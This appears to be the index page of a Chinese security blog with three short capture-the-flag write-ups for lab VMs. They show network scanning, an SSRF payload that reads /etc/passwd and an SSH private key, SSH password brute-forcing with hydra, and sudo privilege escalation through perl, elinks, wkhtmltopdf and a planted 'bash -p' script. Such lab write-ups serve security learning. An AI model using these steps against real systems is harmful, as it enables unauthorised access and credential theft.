<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"lvzhouhang.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="lvzhouhang">
<meta property="og:url" content="https://lvzhouhang.xyz/index.html">
<meta property="og:site_name" content="lvzhouhang">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="lvzhouhang">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://lvzhouhang.xyz/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>lvzhouhang</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">lvzhouhang</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lvzhouhang"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">lvzhouhang</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">64</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/19/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Anjy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/19/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Anjy/" class="post-title-link" itemprop="url">群友靶机-Anjy</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-19 16:23:50 / 修改时间：16:35:27" itemprop="dateCreated datePublished" datetime="2025-04-19T16:23:50+08:00">2025-04-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/660930334/" itemprop="url" rel="index"><span itemprop="name">660930334</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l扫描靶机地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:da:a9:b6       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.147  08:00:27:e8:2b:5e       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br></pre></td></tr></table></figure>

<p>192.168.31.147就是靶机ip，然后nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.147</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 04:25 EDT</span><br><span class="line">Nmap scan report for 192.168.31.147</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:E8:2B:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds</span><br></pre></td></tr></table></figure>

<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>80端口是一个web页面存在ssrf漏洞，POST传参<code>url=file:///etc/passwd</code>，文件内容会进行base64加密</p>
<p>可以读取到welcome这个用户，home目录下不存在id_rsa,读取/etc/ssh/sshd_config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">#HostKey /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure>

<p>然后挨个试试id_rsa,id_ecdsa,id_ed25519,可以发现存在<code>id_ed25519</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///home/welcome/.ssh/id_ed25519</span><br></pre></td></tr></table></figure>

<p>拿到私钥了就可以ssh登录了</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ssh welcome@192.168.31.147 -i id</span><br><span class="line">Linux Anjv 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Apr 19 04:31:17 2025 from 192.168.31.129</span><br><span class="line">welcome@Anjv:~$</span><br></pre></td></tr></table></figure>

<p>sudo -l可以发现elinks可以以root用户执行，可以直接读取root.txt，也可以任意文件读写，最简单的是再elinks终端按下esc-&gt;file-&gt;OS SHELL</p>
<p>就可以获取到root的shell了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/19/HackmyVM-find/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/19/HackmyVM-find/" class="post-title-link" itemprop="url">HackmyVM-find</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-19 11:22:30 / 修改时间：11:39:02" itemprop="dateCreated datePublished" datetime="2025-04-19T11:22:30+08:00">2025-04-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>3 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:dd:48:d1       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.145  08:00:27:19:2f:ed       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.145是靶机ip，扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.145</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 23:23 EDT</span><br><span class="line">Nmap scan report for 192.168.31.145</span><br><span class="line">Host is up (0.0022s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:19:2F:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds</span><br></pre></td></tr></table></figure>

<p>扫描目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.145/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m</span><br><span class="line">edium.txt -x .php,.txt,.jpg</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.145/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/cat.jpg              (Status: 200) [Size: 35137]</span><br><span class="line">/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.31.145/manual/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 13]</span><br><span class="line">/server-status        (Status: 403) [Size: 279]</span><br></pre></td></tr></table></figure>

<h1 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h1><p>robots.txt是让你找到user,把cat.jpg下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# strings cat.jpg</span><br><span class="line">...</span><br><span class="line">&gt;C&lt;;_&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy&lt;XW</span><br><span class="line">VOsrRKPONGk.-,+*)(&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML</span><br><span class="line">KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR</span><br></pre></td></tr></table></figure>

<p>最后一串字符串是<a target="_blank" rel="noopener" href="https://malbolge.doleczek.pl/">Malbolge</a>语言，跑一下得到<code>missyred</code>，然后hydra爆破密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hydra -l missyred -P /usr/share/wordlists/rockyou.txt 192.168.31.145 ssh</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-18 23:30:36</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.31.145:22/</span><br><span class="line">[22][ssh] host: 192.168.31.145   login: missyred   password: iloveyou</span><br></pre></td></tr></table></figure>

<p>ssh登录,sudo -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">missyred@find:~$ sudo -l</span><br><span class="line">[sudo] password for missyred:</span><br><span class="line">Matching Defaults entries for missyred on find:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User missyred may run the following commands on find:</span><br><span class="line">    (kings) /usr/bin/perl</span><br></pre></td></tr></table></figure>

<p>perl提权到kings</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">missyred@find:~$ sudo -u kings perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kings@find:~$ sudo -l</span><br><span class="line">Matching Defaults entries for kings on find:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User kings may run the following commands on find:</span><br><span class="line">    (ALL) NOPASSWD: /opt/boom/boom.sh</span><br></pre></td></tr></table></figure>

<p>/opt/boom/boom.sh是不存在的，我们可以自己创建，随便执行sh命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#boom.sh</span><br><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<p>sudo /opt/boom/boom.sh</p>
<p>提权到root.txt</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/19/HackmyVM-hotel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/19/HackmyVM-hotel/" class="post-title-link" itemprop="url">HackmyVM-hotel</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-19 10:56:13 / 修改时间：11:19:09" itemprop="dateCreated datePublished" datetime="2025-04-19T10:56:13+08:00">2025-04-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>968</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:f8:3e:94       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.144  08:00:27:5c:e1:4f       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.144就是靶机ip，扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64</span><br><span class="line">80/tcp open  http    syn-ack ttl 64</span><br></pre></td></tr></table></figure>

<p>开启了22和80端口</p>
<h1 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h1><p>80端口是一个hoteldruid，存在nday<a target="_blank" rel="noopener" href="https://github.com/kaal18/CVE-2022-22909#">https://github.com/kaal18/CVE-2022-22909#</a></p>
<p>反弹一个shell出来，/var/www/html目录下有一个ttylog很可疑，用ttyplay可以重现当时录制的tty</p>
<p>得到person的密码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Endur4nc3.</span><br></pre></td></tr></table></figure>

<p>ssh登录，拿到user.txt</p>
<h1 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h1><p>sudo -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">person@hotel:~$ sudo -l</span><br><span class="line">Matching Defaults entries for person on hotel:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User person may run the following commands on hotel:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/wkhtmltopdf</span><br></pre></td></tr></table></figure>

<p>sudo /usr/bin/wkhtmltopdf file:///root/root.txt 1.pdf可以拿到root.txt</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/" class="post-title-link" itemprop="url">春秋云镜-Initial</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-18 20:00:10 / 修改时间：20:34:49" itemprop="dateCreated datePublished" datetime="2025-04-18T20:00:10+08:00">2025-04-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
